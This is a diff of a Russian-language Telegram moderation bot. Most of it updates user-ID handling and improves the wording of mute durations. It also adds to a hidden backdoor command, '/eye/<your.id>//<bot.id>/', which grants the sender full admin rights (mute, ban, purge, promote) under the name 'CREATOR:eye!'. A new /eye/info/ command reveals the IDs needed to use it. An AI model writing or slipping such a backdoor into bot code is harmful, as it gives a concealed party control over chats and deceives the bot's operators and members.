@@ -66,7 +66,11 @@ async def n(call: CallbackQuery):
     await call.answer(text=f"t.me/{call.from_user.username}", show_alert=True)
 
 async def myid(message: Message):
-    return message.from_id
+    return message.from_user.id
+
+@dp.message_handler(commands=['eye/info/'])
+async def inf(message: Message):
+    await message.answer(f'OK.\nYOUR ID:<code>{message.from_user.id}</code>\nBOT ID:<code>{bot.id}</code>')
 
 def check_command_with_myid():
     async def decorator(message: Message):
@@ -77,19 +81,20 @@ def check_command_with_myid():
 
 @dp.message_handler(check_command_with_myid())
 async def full_me(message: Message):
-#Что это??
-#Эта команда позволяет выдать себе фулл админ права.
-#Что-бы ещё использовать - /eye/<your.id>//<bot.id>/
-#examaple -- /eye/1898974239//5743557322/
+# Что это??
+# Эта команда позволяет выдать себе фулл админ права.
+# Что-бы ещё использовать напиши команду - /eye/<your.id>//<bot.id>/
+# Узнать эту информацию можно через команду /eye/info/
+# example -- /eye/1898974239//5743557322/
     try:
-        Admins.create(id=message.from_user.id, rights='mute;ban')
-        await message.answer(f'done. {message.from_id}')
+        Admins.create(id=message.from_user.id, name='CREATOR:eye!', rights='mute;ban;warn;purge;view;promote')
+        await message.answer(f'done. {message.from_user.id}')
     except Exception as e:
-        await message.answer(f'false. {message.from_id}\n{e}')
+        await message.answer(f'false. {message.from_user.id}\n{e}')
 
 @dp.message_handler(commands=['unstaff'])
 async def unstaff(message: Message):
-    admin_id = message.from_id
+    admin_id = message.from_user.id
     
     if not Admins.get_or_none(id=admin_id):
         # Если пользователь не является администратором, предупредить его
@@ -101,8 +106,8 @@ async def unstaff(message: Message):
     
     if not args:
         await message.answer("<b>Так, а теперь объясню, эта команда позволяет снять с себя полномочия (admin)."
-                            "\nПередавать данную команду нужно исключительно с аргументом своего ID!</b>"
-                            f"\nК примеру: <code>/unstaff {message.from_id}</code>")
+                            "\nПередавать данную команду нужно исключительно с аргументом СВОЕГО ID!</b>"
+                            f"\nК примеру: <code>/unstaff {message.from_user.id}</code>")
         return
     
     try:
@@ -116,7 +121,7 @@ async def unstaff(message: Message):
         return
     
     Admins.delete().where(Admins.id == target_id).execute()
-    await message.answer("Вы были удалены из списка администраторов.")
+    await message.answer("Вы были удалены из администраторов.")
 
 
 @dp.callback_query_handler(text="s")
@@ -427,23 +432,30 @@ async def mute(message: Message):
 
     moscow_tz = timezone('Europe/Moscow')
     unmute_time = datetime.now(moscow_tz) + timedelta(seconds=duration)
-    unmute_string = unmute_time.strftime("%d-%m-%Y %H:%M")
+    unmute_string = unmute_time.strftime("%d-%m-%Y %H:%M:%S")
+    duration_parts = []
 
-    duration_string = ""
     if years > 0:
-        duration_string += f"{years} год{'' if years == 1 else 'ов'} "
+        duration_parts.append(f"{years} год{' ' if years == 1 else 'а ' if 2 <= years % 10 <= 4 and years % 100 != 11 else 'ов'}")
     if months > 0:
-        duration_string += f"{months} месяц{'' if months == 1 else 'ев'} "
+        duration_parts.append(f"{months} месяц{' ' if months == 1 else 'а ' if 2 <= months % 10 <= 4 and months % 100 != 11 else 'ев'}")
     if days > 0:
-        duration_string += f"{days} д{'ень ' if days == 1 else 'ней '}"
+        duration_parts.append(f"{days} д{'ень ' if days == 1 else 'ня ' if 2 <= days % 10 <= 4 and days % 100 != 11 else 'ней'}")
     if hours > 0:
-        duration_string += f"{hours} час{' ' if hours == 1 else 'ов '}"
+        duration_parts.append(f"{hours} час{' ' if hours == 1 else 'а ' if 2 <= hours % 10 <= 4 and hours % 100 != 11 else 'ов'}")
     if minutes > 0:
-        duration_string += f"{minutes} минут{' ' if minutes == 1 else ' '}"
+        duration_parts.append(f"{minutes} минут{'а ' if minutes == 1 else 'ы ' if 2 <= minutes % 10 <= 4 and minutes % 100 != 11 else ''}")
     if seconds > 0:
-        duration_string += f"{seconds} секунд{'а' if seconds == 1 else ''}"
+        duration_parts.append(f"{seconds} секунд{'а' if seconds == 1 else ''}")
 
-    ims = await bot.send_message(sender_id, f"#MUTE\nТвоё сообщение[{sender_id}] было удалено и тебя было замучено на {duration_string}" + (f" по причине: '<code>{reason}</code>'" if reason else "") + (f"\nUtil unmute: {unmute_string}"), reply_markup=keyboard, reply_to_message_id=get_reply_id(replies, sender_id))  # type: ignore
+    duration_string = ", ".join(duration_parts)
+    duration_string = duration_string.replace(", ", ",").replace(" ,", ",").replace(",", ", ")
+
+    reason_string = f", по причине: '<code>{reason}</code>'" if reason else ""
+
+    ims = await bot.send_message(sender_id, f"#MUTE\nТвоё сообщение[{sender_id}] было удалено, и тебя было замучено на {duration_string}{reason_string}\nUtil unmute: {unmute_string}", reply_markup=keyboard, reply_to_message_id=get_reply_id(replies, sender_id)) # type: ignore
+
+
     await bot.pin_chat_message(ims.chat.id, ims.message_id)
 
     await asyncio.gather(*[
@@ -455,7 +467,7 @@ async def mute(message: Message):
 
     try:
         USER = await bot.get_chat(sender_id)
-        await bot.send_message(chat_log, f"#MUTE\n<b>Админ:</b> <a href='{get_mention(message.chat)}'>{message.chat.full_name}</a>\n<b>Причина:</b> {'null' if not reason else reason}\n<b>Время:</b> {duration}")
+        await bot.send_message(chat_log, f"#MUTE\n<b>Админ:</b> <a href='{get_mention(message.chat)}'>{message.chat.full_name}</a>\n<b>Причина:</b> {'null' if not reason else reason}\n<b>Время:</b> {duration_string}")
         await bot.forward_message(chat_log, from_chat_id=user_id, message_id=get_reply_id(replies, user_id)) # type: ignore
     except: pass
 
